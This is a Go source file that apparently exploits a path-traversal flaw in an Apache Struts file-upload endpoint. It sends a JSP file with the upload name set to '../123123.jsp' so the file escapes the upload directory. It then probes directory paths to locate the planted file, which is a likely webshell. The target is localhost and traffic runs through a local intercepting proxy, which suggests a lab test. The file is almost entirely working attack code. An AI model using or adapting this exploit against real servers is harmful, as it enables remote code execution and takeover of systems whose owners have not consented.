package main

import (
	"fmt"
	"github.com/imroc/req/v3"
	URL "net/url"
	"strings"
)

func Checkurl(url string, path string) string {
	fmt.Println(url)
	u, err := URL.Parse(url)
	if err != nil {
		fmt.Println(err)
	}
	u.Path, _ = URL.JoinPath(u.Path, path)

	return u.String()
} //用来检查url是否是以/结尾如果是的话就去除

func Proxy() *req.Client {
	client := req.C()

	return client
}

func Scan(url string, path string, file string, servername string) {

	checkurl := Checkurl(url, path)
	client := Proxy()
	client.SetProxyURL("http://127.0.0.1:1111")
	r := client.R()
	post, err := r.EnableForceMultipart().SetFiles(map[string]string{
		"Upload": file,
	}).SetFormData(map[string]string{
		"uploadFileName[0]": servername,
	}).Post(checkurl)
	if err != nil {
		fmt.Println(err)
	}
	if post.IsSuccessState() {
		fmt.Println("上传成功")
		fmt.Println("开始遍历文件目录")
		url = url + "/"
		Checkfile(client, url, path, servername)
	} else {
		fmt.Println("上传失败")
	}

}

var Req []string

func Checkfile(client *req.Client, url, path, servername string) {
	request := client.R()
	split := strings.Split(path, "/")
	var a string
	for _, s := range split {
		if a == "" {
			a = s
		} else {
			a = a + "/" + s
		}
		Req = append(Req, a)
	}
	if strings.HasPrefix(servername, "../") || strings.HasPrefix(servername, "./") {
		servername = strings.TrimPrefix(servername, "../")
		servername = strings.TrimPrefix(servername, "./")
	}
	fmt.Println(servername)
	for _, R := range Req {
		Urlt := url + R + "/" + servername
		fmt.Println("尝试", Urlt)
		get, err := request.Get(Urlt)
		if err != nil {
			fmt.Println(err)
		}
		if get.IsSuccessState() {
			fmt.Println("访问成功")
			fmt.Println("文件路径是:", Urlt)
		} else {
			fmt.Println("访问失败")
		}
	}
}

func main() {

	Scan("http://127.0.0.1:8089", "/untitled_war/uploads.action", "1.jsp", "../123123.jsp")
}
